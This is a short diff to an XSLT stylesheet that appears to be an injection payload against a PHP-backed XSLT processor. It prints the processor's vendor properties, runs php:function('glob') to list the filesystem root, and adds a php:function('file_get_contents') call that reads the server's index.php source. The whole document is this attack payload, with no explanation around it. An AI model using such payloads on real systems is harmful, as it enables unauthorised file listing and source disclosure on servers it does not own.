@@ -11,6 +11,8 @@
  Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
  
    EXEC : <xsl:value-of select="php:function('glob', '/*', 8192)" /> <br />
+   
+   EXEC : <xsl:value-of select="php:function('file_get_contents', './index.php')" /> <br />
  
  <xsl:if test="system-property('xsl:product-name')">
  Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
